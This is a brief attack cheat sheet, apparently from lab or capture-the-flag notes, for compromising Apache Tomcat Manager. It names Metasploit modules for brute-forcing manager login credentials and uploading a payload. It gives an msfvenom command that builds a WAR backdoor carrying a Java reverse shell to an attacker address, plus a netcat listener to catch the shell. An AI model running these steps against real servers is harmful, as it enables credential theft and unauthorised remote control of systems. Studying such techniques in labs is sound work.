# Method 1 (msfconsole)
1. Hack manager login credentials using 'auxiliary/scanner/http/tomcat_mgr_login'
2. Use 'exploit/multi/http/tomcat_mgr_upload'

# Method 2 (generate war file with reverse shell)
1. Generate WAR file backdoor using msfvenom
```
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.45 LPORT=4444 -f war > payload.war
```

2. Reverse shell with netcat 
```
nc -lvnp 4444
```

